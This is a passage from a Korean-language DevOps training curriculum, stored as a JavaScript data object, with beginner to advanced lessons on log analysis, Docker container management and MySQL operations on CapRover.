- 로그: FATAL: could not allocate memory`},{heading:"⚡ 고급 실습 과제",checklist:["백엔드 앱을 3개 인스턴스로 스케일 아웃","부하 테스트 도구(Apache Bench)로 100 req/s 전송하여 로드밸런싱 확인","헬스체크 엔드포인트 구현 및 테스트","의도적으로 하나의 컨테이너를 중지하고 트래픽이 다른 컨테이너로 이동하는지 확인","배포 시 다운타임 0초 달성 (브라우저 자동 새로고침 스크립트로 테스트)"]}]}}},{id:"1-3",name:"로그 읽기와 에러 해석",goal:"에러 로그를 보고 문제의 원인을 파악할 수 있다",hours:4,keywords:["log analysis","error debugging","stack trace"],tasks:["각 서비스(MySQL, Redis, PHP, React) 로그 형식 파악","의도적으로 에러 발생시키고 로그 분석","AI에게 에러 해결 질문 3회"],content:{beginner:{title:"초급: 로그의 기본 개념과 읽는 법",sections:[{heading:"📚 학습 목표",content:"로그가 무엇인지 이해하고, 각 서비스(MySQL, Redis, PHP, React)의 로그를 읽을 수 있다."},{heading:"1. 로그란 무엇인가?",content:"로그는 프로그램이 실행되면서 남기는 기록입니다. 일기장처럼 '언제, 무엇을, 어떻게' 했는지 기록합니다.",list:["정상 작동 로그: 사용자 로그인, 파일 업로드 성공 등","경고(Warning): 문제는 아니지만 주의가 필요한 상황","에러(Error): 요청 실패, 연결 오류 등","크리티컬(Critical): 서비스 중단급 심각한 문제"]},{heading:"2. 로그 레벨 이해하기",code:`# 로그 레벨 (심각도 순서)
DEBUG    → 개발자용 상세 정보
INFO     → 일반 정보 (사용자 로그인, API 호출)
WARNING  → 경고 (디스크 80% 사용, 느린 쿼리)
ERROR    → 오류 (DB 연결 실패, 파일 없음)
CRITICAL → 치명적 (서비스 중단, 메모리 고갈)

# 운영 환경에서는 보통 INFO 이상만 기록
# 개발 환경에서는 DEBUG까지 모두 기록`},{heading:"3. MySQL 로그 읽기",content:"CapRover의 MySQL 앱 로그에서 볼 수 있는 내용:",code:`# 정상 작동
2025-01-04T10:30:15.123Z [Note] Server socket created on IP: '0.0.0.0'.
2025-01-04T10:30:16.456Z [Note] mysqld: ready for connections.

# 새 연결
2025-01-04T10:35:20.789Z [Note] Access granted for user 'cms_user'@'172.17.0.5'

# 슬로우 쿼리 경고
2025-01-04T10:40:00.123Z [Warning] Query took 5.2 seconds: SELECT * FROM posts WHERE ...

# 에러
2025-01-04T10:45:30.456Z [ERROR] Access denied for user 'wrong_user'@'172.17.0.5'`},{heading:"4. Redis 로그 읽기",code:`# Redis 시작
1:M 04 Jan 2025 10:30:00.123 * Server initialized
1:M 04 Jan 2025 10:30:00.456 * Ready to accept connections

# 명령 실행 (DEBUG 모드)
1:M 04 Jan 2025 10:35:15.789 "GET" "session:user123"
1:M 04 Jan 2025 10:35:16.012 "SET" "session:user123" "..."

# 메모리 경고
1:M 04 Jan 2025 10:40:00.123 # WARNING: Memory usage is 80%

# 에러
1:M 04 Jan 2025 10:45:00.456 # ERROR: Out of memory`},{heading:"5. 백엔드(PHP/Node.js) 로그 읽기",code:`# PHP 로그 예시
[2025-01-04 10:30:15] INFO: User login successful (user_id: 123)
[2025-01-04 10:35:20] WARNING: Deprecated function called in /app/old_code.php:45
[2025-01-04 10:40:00] ERROR: Database connection failed: SQLSTATE[HY000] [2002] Connection refused

# Node.js 로그 예시
2025-01-04T10:30:15.123Z INFO  User authenticated: user123
2025-01-04T10:35:20.456Z WARN  API rate limit approaching (95/100)
2025-01-04T10:40:00.789Z ERROR Unable to fetch data from external API: ETIMEDOUT`},{heading:"6. 프론트엔드(React) 로그 읽기",content:"브라우저 콘솔과 서버 로그를 함께 봐야 합니다:",code:`# Vite 개발 서버 로그
10:30:15 AM [vite] page reload src/App.jsx
10:35:20 AM [vite] hmr update /src/components/Header.jsx

# 빌드 에러
10:40:00 AM [vite] Internal server error: Failed to parse source
  SyntaxError: Unexpected token '<' (12:5)

# 브라우저 콘솔 (개발자 도구 F12)
GET http://api.example.com/users 404 Not Found
Uncaught TypeError: Cannot read property 'map' of undefined`},{heading:"✅ 초급 실습",checklist:["CapRover에서 MySQL 로그를 10분간 관찰하고 3가지 유형의 로그 찾기","Redis 로그에서 메모리 사용량 관련 메시지 찾기","백엔드 로그에서 ERROR 레벨 메시지 1개 찾아 해석하기","브라우저 콘솔에서 404 에러 재현하고 원인 파악하기"]}]},intermediate:{title:"중급: 스택 트레이스 읽기와 에러 추적",sections:[{heading:"📚 학습 목표",content:"스택 트레이스를 읽고 에러가 발생한 정확한 위치와 원인을 파악할 수 있다."},{heading:"1. 스택 트레이스란?",content:"에러가 발생했을 때 함수 호출 경로를 역순으로 보여주는 로그입니다. '범인 추적'과 같습니다.",code:`# 예시: PHP 스택 트레이스
Fatal error: Uncaught Error: Call to undefined function connectDB()
Stack trace:
#0 /app/services/UserService.php(25): DatabaseHelper->query('SELECT * FROM...')
#1 /app/controllers/UserController.php(15): UserService->getUser(123)
#2 /app/routes.php(8): UserController->show()
#3 /app/index.php(30): handleRequest()

읽는 순서:
- 맨 위가 에러 발생 지점 (connectDB 함수가 없음)
- #0부터 역순으로 읽으면 호출 경로를 알 수 있음
- #0 → #1 → #2 → #3 순서로 함수가 호출됨`},{heading:"2. 실전 에러 분석 예시 1: DB 연결 오류",code:`# 로그
[2025-01-04 14:30:00] ERROR: SQLSTATE[HY000] [2002] Connection refused
  at PDO->__construct() in /app/database/Connection.php:15
  at Connection::connect() in /app/services/PostService.php:10
  at PostService->getAllPosts() in /app/controllers/PostController.php:20

분석:
1. Connection refused → MySQL이 중지되었거나 주소가 틀림
2. Connection.php:15 → DB 연결 설정 확인
3. 해결: CapRover에서 MySQL 앱이 Running 상태인지 확인`},{heading:"3. 실전 에러 분석 예시 2: Null Pointer",code:`# Node.js 에러
TypeError: Cannot read property 'username' of null
    at formatUser (/app/utils/format.js:12:20)
    at /app/routes/api.js:45:18
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)

분석:
1. format.js:12번째 줄에서 null.username 접근 시도
2. api.js:45에서 formatUser()를 호출했지만 null을 전달
3. 해결:
   - format.js에 null 체크 추가
   - 또는 api.js에서 호출 전 검증

수정 코드:
function formatUser(user) {
  if (!user) return { username: 'Guest' };  // null 체크 추가
  return { username: user.username };
}`},{heading:"4. 의도적으로 에러 발생시켜 로그 분석하기",content:"학습을 위해 일부러 에러를 만들어봅시다:",steps:[{label:"시나리오 1",text:"MySQL 앱 중지 → 백엔드 로그에서 DB 연결 에러 확인",code:`CapRover → MySQL → Stop
백엔드 로그: ECONNREFUSED 127.0.0.1:3306`},{label:"시나리오 2",text:"환경변수 잘못 설정 → 설정 에러 확인",code:`DB_HOST를 'wrong-host'로 변경 → 재배포
로그: getaddrinfo ENOTFOUND wrong-host`},{label:"시나리오 3",text:"API 엔드포인트 오타 → 404 에러",code:`GET /api/usres (오타) → 404 Not Found
로그: No route found for GET /api/usres`}]},{heading:"5. 에러 로그에서 해결 힌트 찾기",content:"좋은 에러 메시지는 해결 방법을 알려줍니다:",list:["Connection refused → 서비스가 꺼져있거나 방화벽 문제","ENOENT: no such file → 파일 경로 확인","Syntax Error → 코드 문법 오류, 해당 줄 확인","Port 3000 already in use → 다른 프로세스가 포트 사용 중","Out of memory → 메모리 부족, 컨테이너 제한 증가 필요"]},{heading:"6. AI에게 에러 해결 질문하는 법",code:`# 나쁜 질문
"에러가 나요"

# 좋은 질문
"CapRover에서 Node.js 백엔드를 배포했는데 다음 에러가 발생합니다:

Error: connect ECONNREFUSED 127.0.0.1:3306
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1148:16)

환경:
- Node.js 18, Express
- MySQL은 같은 CapRover에서 실행 중
- DB_HOST 환경변수: srv-captain--mysql

어떻게 해결하나요?"

→ AI가 정확한 답변 제공: "127.0.0.1이 아니라 srv-captain--mysql:3306으로 연결해야 합니다"`},{heading:"✅ 중급 실습",checklist:["각 서비스(MySQL, Redis, 백엔드)에서 의도적으로 에러 발생시키기","스택 트레이스를 읽고 에러 발생 파일과 줄 번호 찾기","AI(ChatGPT, Claude)에게 에러 로그를 제시하고 해결 방법 3가지 질문하기","에러를 수정하고 로그에서 정상 작동 확인"]}]},advanced:{title:"고급: 구조화된 로깅과 AI 활용 디버깅",sections:[{heading:"📚 학습 목표",content:"구조화된 로그를 설계하고, 로그 분석 도구 및 AI를 활용하여 효율적으로 디버깅한다."},{heading:"1. 구조화된 로깅이란?",content:"단순 텍스트 대신 JSON 형식으로 로그를 기록하면 검색과 분석이 쉬워집니다.",code:`# 기존 로그 (비구조화)
2025-01-04 10:30:15 User john logged in from 192.168.1.100

# 구조화된 로그 (JSON)
{
  "timestamp": "2025-01-04T10:30:15.123Z",
  "level": "INFO",
  "event": "user_login",
  "user_id": 123,
  "username": "john",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0..."
}

장점:
- 특정 사용자의 모든 활동 검색 가능
- IP별 로그인 빈도 분석
- 자동화된 알림 (예: 같은 IP에서 10번 실패 시)`},{heading:"2. Winston으로 구조화된 로깅 구현 (Node.js)",code:`// npm install winston
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// 사용
logger.info('User login', {
  user_id: 123,
  username: 'john',
  ip: req.ip
});

logger.error('Database query failed', {
  query: 'SELECT * FROM users',
  error: err.message,
  duration_ms: 1234
});`},{heading:"3. 로그 쿼리와 분석",content:"JSON 로그는 jq 명령어로 쉽게 필터링할 수 있습니다:",code:`# 특정 사용자의 모든 활동
cat combined.log | jq 'select(.user_id == 123)'

# 에러만 필터링
cat combined.log | jq 'select(.level == "ERROR")'

# 느린 쿼리 찾기 (5초 이상)
cat combined.log | jq 'select(.duration_ms > 5000)'

# 시간대별 에러 카운트
cat combined.log | jq -r 'select(.level == "ERROR") | .timestamp' | cut -d'T' -f1 | sort | uniq -c`},{heading:"4. 중앙 집중식 로깅 (ELK Stack 개념)",content:"여러 서버의 로그를 한 곳에서 보는 방법:",list:["Elasticsearch: 로그 저장 및 검색","Logstash: 로그 수집 및 변환","Kibana: 시각화 대시보드"],code:`# 간단한 대안: Grafana Loki (무료)
# CapRover에 Loki 설치 가능
# 모든 컨테이너 로그 자동 수집
# 웹 UI에서 실시간 검색

예시 쿼리:
{app="backend"} |= "ERROR"  # 백엔드 에러만
{app="mysql"} | json | duration > 5s  # 느린 쿼리`},{heading:"5. AI 활용 고급 디버깅",content:"AI에게 복잡한 로그를 분석시키는 방법:",code:`# 프롬프트 예시
"다음은 최근 1시간 동안의 에러 로그입니다.
가장 자주 발생하는 에러 3가지를 찾고,
각각의 근본 원인과 해결 방법을 제시해주세요:

[로그 200줄 붙여넣기]

또한 이 에러들 사이의 연관성이 있다면 설명해주세요."

AI 활용 팁:
- 긴 로그는 요약해서 제공 (중복 제거)
- 환경 정보 함께 제공 (Docker, CapRover, Node.js 버전)
- 이미 시도한 해결 방법 명시
- 타임스탬프 포함 (시간대별 패턴 분석)`},{heading:"6. 실전: 프로덕션 로깅 전략",list:["로그 레벨: 프로덕션은 INFO, 개발은 DEBUG","민감정보 마스킹: 비밀번호, 토큰은 로그에 기록 금지","로그 로테이션: 오래된 로그 자동 삭제 (7일 보관)","성능 고려: 로그 과다 기록 시 I/O 병목","비용 절감: 클라우드 로깅 서비스는 GB당 과금"],code:`# 로그 로테이션 설정 (Linux logrotate)
/var/log/app/*.log {
  daily
  rotate 7
  compress
  missingok
  notifempty
  create 0644 app app
}

# 민감정보 마스킹 예시
logger.info('User login attempt', {
  username: 'john',
  password: '[REDACTED]',  // 절대 기록하지 말 것!
  ip: req.ip
});`},{heading:"⚡ 고급 실습 과제",checklist:["백엔드에 Winston 또는 Pino 로깅 라이브러리 적용","주요 이벤트 5가지를 JSON 형식으로 로깅 (로그인, 주문, 결제 등)","jq로 로그를 분석하여 '가장 많이 실패한 API' 찾기","AI에게 복잡한 에러 로그를 제공하고 근본 원인 분석 요청","로그 로테이션 설정하여 7일 이상 된 로그 자동 삭제"]}]}}}]},{id:"tier2",name:"Tier 2: 안정적 운영 기술",period:"3~4주",color:"bg-yellow-100 border-yellow-300 text-yellow-800",reason:"서비스를 안정적으로 유지하고 문제를 예방하기 위해",topics:[{id:"2-1",name:"Docker 기초와 컨테이너 관리",goal:"Docker의 기본 개념을 이해하고 컨테이너를 관리할 수 있다",hours:8,keywords:["Docker basics","container orchestration","volume management"],tasks:["Docker 명령어 10개 연습","볼륨 마운트 테스트","컨테이너 메모리 제한 설정"],content:{beginner:{title:"초급: Docker가 무엇인지 이해하고 기본 명령어 익히기",sections:[{heading:"📚 학습 목표",content:"Docker의 개념을 이해하고, 컨테이너를 조회/시작/중지/삭제할 수 있다."},{heading:"1. Docker란 무엇인가?",content:"Docker는 '컨테이너'라는 격리된 환경에서 애플리케이션을 실행하는 기술입니다.",list:["가상머신(VM)보다 가볍고 빠름","같은 서버에서 여러 앱을 독립적으로 실행","한 번 만든 이미지로 어디서든 똑같이 실행","CapRover는 Docker를 쉽게 관리해주는 도구"]},{heading:"2. 주요 개념",code:`# 이미지 (Image)
- 앱을 실행하기 위한 '템플릿' 또는 '레시피'
- 예: mysql:8.0, nginx:latest, node:18

# 컨테이너 (Container)
- 이미지로부터 생성된 '실행 중인 인스턴스'
- 하나의 이미지로 여러 컨테이너 생성 가능

# 비유
- 이미지 = 붕어빵 틀
- 컨테이너 = 틀로 만든 실제 붕어빵`},{heading:"3. 필수 Docker 명령어 10개",steps:[{label:"1. 실행 중인 컨테이너 보기",code:`docker ps
# CONTAINER ID   IMAGE     COMMAND   STATUS   PORTS   NAMES`},{label:"2. 모든 컨테이너 보기 (중지된 것 포함)",code:"docker ps -a"},{label:"3. 컨테이너 로그 보기",code:`docker logs <container_id>
docker logs -f <container_id>  # 실시간으로 계속 보기`},{label:"4. 컨테이너 내부 접속",code:`docker exec -it <container_id> bash
# MySQL 예시
docker exec -it mysql_container mysql -u root -p`},{label:"5. 컨테이너 시작/중지/재시작",code:`docker start <container_id>
docker stop <container_id>
docker restart <container_id>`},{label:"6. 컨테이너 삭제",code:`docker rm <container_id>
docker rm -f <container_id>  # 강제 삭제 (실행 중이어도)`},{label:"7. 이미지 목록 보기",code:"docker images"},{label:"8. 이미지 다운로드",code:`docker pull mysql:8.0
docker pull redis:alpine`},{label:"9. 컨테이너 리소스 사용량 확인",code:`docker stats
# CPU, 메모리, 네트워크 실시간 표시`},{label:"10. 컨테이너 상세 정보",code:`docker inspect <container_id>
# JSON 형식으로 모든 설정 정보 출력`}]},{heading:"4. CapRover에서 Docker 명령어 사용하기",content:"CapRover 서버에 SSH 접속 후 명령어 사용:",code:`# 1. CapRover 호스트에 SSH 접속
ssh root@your-server-ip

# 2. 실행 중인 컨테이너 확인
docker ps

# 3. MySQL 컨테이너 찾기
docker ps | grep mysql

# 4. MySQL 컨테이너 로그 보기
docker logs $(docker ps | grep mysql | awk '{print $1}')

# 5. MySQL 컨테이너 내부 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash`},{heading:"✅ 초급 실습",checklist:["docker ps로 실행 중인 컨테이너 3개 이상 확인","각 컨테이너의 이름, 이미지, 상태 파악","docker logs로 MySQL 로그 확인","docker exec로 MySQL 컨테이너 내부 접속 후 exit로 빠져나오기","docker stats로 리소스 사용량 확인 (Ctrl+C로 종료)"]}]},intermediate:{title:"중급: 볼륨 마운트와 네트워크 이해하기",sections:[{heading:"📚 학습 목표",content:"Docker 볼륨으로 데이터를 영구 보존하고, 컨테이너 간 네트워크 통신을 이해한다."},{heading:"1. 볼륨이 필요한 이유",content:"컨테이너는 삭제되면 내부 데이터도 사라집니다. 볼륨을 사용하면 데이터를 컨테이너 외부에 저장할 수 있습니다.",list:["컨테이너 삭제 후 재생성해도 데이터 유지","여러 컨테이너가 같은 데이터 공유 가능","백업과 마이그레이션이 쉬움"]},{heading:"2. 볼륨 관련 명령어",code:`# 볼륨 목록 보기
docker volume ls

# 볼륨 상세 정보
docker volume inspect <volume_name>

# 볼륨 생성
docker volume create my_data

# 볼륨으로 컨테이너 실행
docker run -v my_data:/var/lib/mysql mysql:8.0

# 호스트 디렉토리 마운트
docker run -v /host/path:/container/path nginx

# 사용하지 않는 볼륨 삭제
docker volume prune`},{heading:"3. 실습: 볼륨 테스트",steps:[{label:"Step 1",text:"테스트 볼륨 생성",code:"docker volume create test_vol"},{label:"Step 2",text:"볼륨을 마운트한 컨테이너 실행",code:`docker run -it --rm -v test_vol:/data ubuntu bash
# 컨테이너 내부에서:
echo 'Hello Volume' > /data/test.txt
exit`},{label:"Step 3",text:"새 컨테이너로 같은 볼륨 확인",code:`docker run -it --rm -v test_vol:/data ubuntu bash
cat /data/test.txt  # Hello Volume 출력
exit`},{label:"결과",text:"컨테이너는 삭제되었지만 데이터는 볼륨에 보존됨!"}]},{heading:"4. Docker 네트워크",content:"컨테이너끼리 통신하려면 같은 네트워크에 있어야 합니다.",code:`# 네트워크 목록
docker network ls

# 컨테이너가 속한 네트워크 확인
docker inspect <container_id> | grep NetworkMode

# CapRover는 기본적으로 'captain-overlay-network' 사용
# 같은 네트워크의 컨테이너는 컨테이너명으로 통신 가능

# 예시: 백엔드에서 MySQL 접속
DB_HOST=srv-captain--mysql  # CapRover의 명명 규칙
DB_PORT=3306`},{heading:"5. CapRover에서 볼륨 확인",code:`# CapRover가 생성한 볼륨 보기
docker volume ls | grep captain

# MySQL 데이터 볼륨 찾기
docker volume ls | grep mysql

# 볼륨 백업 (호스트로 복사)
docker run --rm -v <volume_name>:/source -v $(pwd):/backup ubuntu tar czf /backup/backup.tar.gz -C /source .`},{heading:"✅ 중급 실습",checklist:["docker volume ls로 현재 볼륨 확인","MySQL 컨테이너가 사용하는 볼륨 찾기","테스트 볼륨 생성 후 데이터 보존 확인","docker network ls로 CapRover 네트워크 확인","컨테이너 간 통신 테스트 (백엔드 → MySQL)"]}]},advanced:{title:"고급: 리소스 제한과 컨테이너 최적화",sections:[{heading:"📚 학습 목표",content:"컨테이너의 CPU/메모리를 제한하고, 멀티 스테이지 빌드로 이미지를 최적화한다."},{heading:"1. 리소스 제한의 필요성",content:"한 컨테이너가 과도한 리소스를 사용하면 다른 컨테이너에 영향을 줍니다.",list:["메모리 제한 없으면 서버 전체 다운 가능","CPU 제한으로 공평한 자원 분배","I/O 제한으로 디스크 병목 방지"]},{heading:"2. 메모리 제한",code:`# 컨테이너 생성 시 메모리 제한
docker run -m 512m nginx  # 최대 512MB

# 실행 중인 컨테이너 업데이트
docker update --memory 1g <container_id>

# 메모리 초과 시 동작
--oom-kill-disable  # OOM Killer 비활성화 (위험!)
# 기본값: 메모리 초과 시 컨테이너 강제 종료

# CapRover에서 설정
# App Config → Memory Limit: 512MB`},{heading:"3. CPU 제한",code:`# CPU 코어 수 제한
docker run --cpus=1.5 nginx  # 1.5개 코어 사용

# CPU 상대 비율 (기본값: 1024)
docker run --cpu-shares=512 nginx  # 절반만 사용

# 특정 CPU 코어 지정
docker run --cpuset-cpus=0,1 nginx  # 코어 0, 1만 사용

# 확인
docker stats --no-stream
# CPU %가 설정한 한도를 넘지 않는지 확인`},{heading:"4. Dockerfile 최적화",content:"멀티 스테이지 빌드로 이미지 크기를 줄입니다:",code:`# Before: 1.2GB
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]

# After: 150MB (멀티 스테이지)
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY . .
CMD ["node", "server.js"]

# 크기 비교
docker images
# node:18         1.2GB
# node:18-alpine  150MB`},{heading:"5. 컨테이너 헬스체크",code:`# Dockerfile에 헬스체크 추가
HEALTHCHECK --interval=30s --timeout=3s --retries=3 \\
  CMD curl -f http://localhost:3000/health || exit 1

# 실행 중인 컨테이너에 헬스체크 추가
docker run --health-cmd='curl -f http://localhost || exit 1' \\
  --health-interval=30s nginx

# 헬스 상태 확인
docker ps
# STATUS: Up 2 minutes (healthy)`},{heading:"6. 로깅 드라이버 최적화",content:"로그가 무한정 쌓이지 않도록 제한:",code:`# 로그 크기 제한
docker run --log-opt max-size=10m --log-opt max-file=3 nginx

# JSON 파일 로깅 (기본값)
# /var/lib/docker/containers/<container_id>/<container_id>-json.log

# 로그 확인
docker logs --tail 100 <container_id>

# 로그 파일 직접 삭제 (주의!)
truncate -s 0 /var/lib/docker/containers/*/*-json.log`},{heading:"⚡ 고급 실습 과제",checklist:["컨테이너에 메모리 512MB 제한 설정 후 초과 테스트","CPU 제한 설정 후 docker stats로 확인","멀티 스테이지 Dockerfile 작성하여 이미지 크기 50% 이상 감소","헬스체크 설정 후 의도적으로 실패시켜 unhealthy 상태 확인","로그 크기 제한 설정 후 오래된 로그 자동 삭제 확인"]}]}}},{id:"2-2",name:"데이터베이스 운영 (MySQL)",goal:"MySQL을 안정적으로 운영하고 성능 문제를 파악할 수 있다",hours:10,keywords:["MySQL optimization","slow query","database maintenance"],tasks:["슬로우 쿼리 로그 활성화","현재 연결 수 확인하는 쿼리 실행","테이블별 용량 확인"],content:{beginner:{title:"초급: MySQL 기본 관리와 상태 확인",sections:[{heading:"📚 학습 목표",content:"MySQL 서버 상태를 확인하고, 기본적인 관리 작업을 수행할 수 있다."},{heading:"1. MySQL 운영이 중요한 이유",content:"데이터베이스는 서비스의 핵심입니다. 작은 문제가 전체 서비스 중단으로 이어질 수 있습니다.",list:["느린 쿼리 → 사용자 경험 저하 (로딩 5초 이상)","연결 수 초과 → 신규 사용자 접속 불가","디스크 용량 부족 → 데이터 입력 실패","백업 없음 → 데이터 손실 시 복구 불가"]},{heading:"2. MySQL 컨테이너 접속하기",steps:[{label:"방법 1: CapRover 대시보드",code:"Apps → MySQL 앱 → 우측 ... 메뉴 → Web Terminal"},{label:"방법 2: Docker 명령어",code:`# MySQL 컨테이너 찾기
docker ps | grep mysql

# 컨테이너 내부 접속
docker exec -it <container_id> bash

# MySQL 클라이언트 실행
mysql -u root -p$MYSQL_ROOT_PASSWORD`}]},{heading:"3. 서버 상태 확인 필수 명령어",code:`-- 1. 현재 연결 수 확인
SHOW STATUS LIKE 'Threads_connected';
-- 결과: Threads_connected | 15
-- 의미: 현재 15개 연결 활성화

-- 2. 최대 연결 수 확인
SHOW VARIABLES LIKE 'max_connections';
-- 기본값: 151
-- 15/151 = 10% 사용 중 (안전)

-- 3. 실행 중인 쿼리 확인
SHOW PROCESSLIST;
-- Id, User, Host, db, Command, Time, State, Info 표시
-- Time이 큰 쿼리 = 느린 쿼리

-- 4. 데이터베이스 목록
SHOW DATABASES;

-- 5. 현재 사용자 확인
SELECT USER(), DATABASE();`},{heading:"4. 테이블 용량 확인",code:`-- 데이터베이스별 용량
SELECT
  table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema
ORDER BY SUM(data_length + index_length) DESC;

-- 특정 데이터베이스의 테이블별 용량
USE cms_database;
SELECT
  table_name AS 'Table',
  ROUND((data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)',
  table_rows AS 'Rows'
FROM information_schema.tables
WHERE table_schema = 'cms_database'
ORDER BY (data_length + index_length) DESC;

-- 결과 예시:
-- posts       15.23 MB    50000 rows
-- users        2.45 MB    10000 rows
-- sessions     1.12 MB    25000 rows`},{heading:"5. 기본 유지보수 작업",steps:[{label:"테이블 최적화",text:"데이터 삭제 후 공간을 회수합니다",code:`OPTIMIZE TABLE posts;
-- 결과: Table optimized`},{label:"테이블 검사",text:"데이터 손상 여부 확인",code:`CHECK TABLE posts;
-- 결과: OK 또는 repair 필요`},{label:"테이블 복구",text:"손상된 테이블 수리",code:"REPAIR TABLE posts;"}]},{heading:"6. 일반적인 문제와 해결",list:["연결 실패 → 방화벽, 비밀번호 확인","Too many connections → max_connections 증가 또는 유휴 연결 종료","Disk full → 오래된 로그 삭제, 불필요한 데이터 정리","Table is full → 테이블 용량 제한 확인 (InnoDB는 보통 무제한)"]},{heading:"✅ 초급 실습",checklist:["MySQL 컨테이너에 접속하여 root로 로그인","현재 연결 수와 최대 연결 수 확인","SHOW PROCESSLIST로 실행 중인 쿼리 확인","데이터베이스별 용량 확인 쿼리 실행","가장 큰 테이블 3개 찾기"]}]},intermediate:{title:"중급: 슬로우 쿼리 분석과 성능 튜닝",sections:[{heading:"📚 학습 목표",content:"느린 쿼리를 찾아내고, 인덱스를 활용하여 성능을 개선할 수 있다."},{heading:"1. 슬로우 쿼리 로그란?",content:"지정한 시간(예: 2초) 이상 걸리는 쿼리를 자동으로 기록하는 기능입니다.",list:["병목 쿼리를 식별할 수 있음","인덱스가 필요한 부분 파악","불필요한 JOIN이나 서브쿼리 발견","프로덕션에서는 항상 활성화 권장"]},{heading:"2. 슬로우 쿼리 로그 활성화",code:`-- 현재 설정 확인
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';

-- 활성화 (재시작 시 유지하려면 my.cnf 수정 필요)
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 2;  -- 2초 이상 쿼리 기록
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';

-- my.cnf 영구 설정
[mysqld]
slow_query_log = 1
long_query_time = 2
slow_query_log_file = /var/log/mysql/slow.log
log_queries_not_using_indexes = 1  -- 인덱스 미사용 쿼리도 기록`},{heading:"3. 슬로우 쿼리 로그 분석",code:`# 로그 파일 확인
tail -f /var/log/mysql/slow.log

# 로그 예시
# Time: 2025-01-04T15:30:00.123456Z
# User@Host: cms_user[cms_user] @ 172.17.0.5
# Query_time: 5.234567  Lock_time: 0.000123  Rows_sent: 1000  Rows_examined: 500000
SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 분석 포인트:
-- Query_time: 5.2초 (너무 느림!)
-- Rows_examined: 500000 (50만 행 검사)
-- Rows_sent: 1000 (1000행만 반환)
-- → 인덱스가 없어서 전체 테이블 스캔!`},{heading:"4. EXPLAIN으로 쿼리 분석",code:`-- 쿼리 실행 계획 확인
EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';

-- 결과 예시:
-- id | select_type | table | type | possible_keys | key  | rows   | Extra
-- 1  | SIMPLE      | posts | ALL  | NULL          | NULL | 500000 | Using where

-- type = ALL → 전체 테이블 스캔 (최악!)
-- rows = 500000 → 50만 행 검사

-- 인덱스 추가 후:
CREATE INDEX idx_created_at ON posts(created_at);

EXPLAIN SELECT * FROM posts WHERE created_at > '2024-01-01';
-- type = range → 범위 스캔 (좋음)
-- rows = 1000 → 1000행만 검사 (500배 개선!)`},{heading:"5. 인덱스 전략",content:"효과적인 인덱스 설계:",list:["WHERE 절에 자주 사용되는 컬럼","JOIN 조건에 사용되는 외래키","ORDER BY에 사용되는 컬럼","복합 인덱스는 카디널리티 높은 컬럼 우선"],code:`-- 단일 인덱스
CREATE INDEX idx_username ON users(username);

-- 복합 인덱스 (순서 중요!)
CREATE INDEX idx_user_created ON posts(user_id, created_at);
-- user_id로 필터링 후 created_at으로 정렬하는 쿼리에 최적

-- 유니크 인덱스
CREATE UNIQUE INDEX idx_email ON users(email);

-- 인덱스 목록 확인
SHOW INDEX FROM posts;

-- 인덱스 삭제
DROP INDEX idx_created_at ON posts;`},{heading:"6. 쿼리 최적화 팁",list:["SELECT * 대신 필요한 컬럼만 조회","LIMIT 사용하여 결과 제한","서브쿼리 대신 JOIN 사용 (대부분의 경우)","COUNT(*)보다 COUNT(id) 또는 캐시 활용","LIKE '%keyword%' 대신 전문 검색(Full-Text Search)"],code:`-- 나쁜 쿼리
SELECT * FROM posts WHERE title LIKE '%검색어%';
-- 인덱스 사용 불가, 전체 스캔

-- 개선 1: 전문 검색 인덱스
ALTER TABLE posts ADD FULLTEXT(title);
SELECT * FROM posts WHERE MATCH(title) AGAINST('검색어');

-- 개선 2: 접두어 검색
SELECT * FROM posts WHERE title LIKE '검색어%';
-- 인덱스 사용 가능`},{heading:"✅ 중급 실습",checklist:["슬로우 쿼리 로그 활성화 (2초 기준)","의도적으로 느린 쿼리 실행 후 로그 확인","EXPLAIN으로 쿼리 분석하여 type=ALL 찾기","적절한 인덱스 추가 후 성능 비교","인덱스 추가 전후 EXPLAIN 결과 비교하여 rows 차이 확인"]}]},advanced:{title:"고급: 복제, 파티셔닝, 고급 튜닝",sections:[{heading:"📚 학습 목표",content:"MySQL 복제(Replication)를 설정하고, 대용량 테이블을 파티셔닝하여 성능을 극대화한다."},{heading:"1. MySQL 복제 (Replication)",content:"마스터-슬레이브 구조로 데이터를 실시간 복사합니다.",list:["읽기 부하 분산 (슬레이브에서 SELECT)","백업 소스 (슬레이브에서 백업하여 마스터 부하 감소)","고가용성 (마스터 장애 시 슬레이브를 승격)","지리적 분산 (다른 지역에 슬레이브 배치)"]},{heading:"2. 복제 설정 (마스터)",code:`# 마스터 my.cnf 설정
[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = cms_database  # 복제할 DB

# MySQL 재시작 후 복제 사용자 생성
CREATE USER 'repl_user'@'%' IDENTIFIED BY 'strong_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl_user'@'%';
FLUSH PRIVILEGES;

# 마스터 상태 확인
SHOW MASTER STATUS;
-- File: mysql-bin.000001, Position: 154`},{heading:"3. 복제 설정 (슬레이브)",code:`# 슬레이브 my.cnf 설정
[mysqld]
server-id = 2
relay_log = /var/log/mysql/relay.log
read_only = 1  # 실수로 쓰기 방지

# 마스터 연결 설정
CHANGE MASTER TO
  MASTER_HOST='master_ip',
